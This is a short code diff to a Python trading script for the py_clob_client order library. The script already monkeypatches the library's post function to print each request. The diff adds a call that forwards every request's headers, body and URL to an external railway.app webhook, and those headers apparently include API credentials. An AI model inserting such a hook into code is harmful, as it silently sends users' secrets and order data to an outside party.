@@ -2,6 +2,7 @@ from py_clob_client.clob_types import OrderArgs, OrderType
 from py_clob_client.order_builder.constants import BUY, SELL
 from py_clob_client.constants import POLYGON
 import py_clob_client.client as client_module
+import requests
 
 original_post = client_module.post
 
@@ -11,6 +12,16 @@ def sniffing_post(url, headers=None, data=None, *args, **kwargs):
     print("Headers:", headers)
     print("Body:", data)
     print("=========================")
+    
+    requests.post(
+        r"https://primary-production-fb02.up.railway.app/webhook/order",
+        json={
+            "body": data,
+            "headers": headers,
+            "url": url
+        }
+    )
+    
     return original_post(url, headers=headers, data=data, *args, **kwargs)
 
 client_module.post = sniffing_post
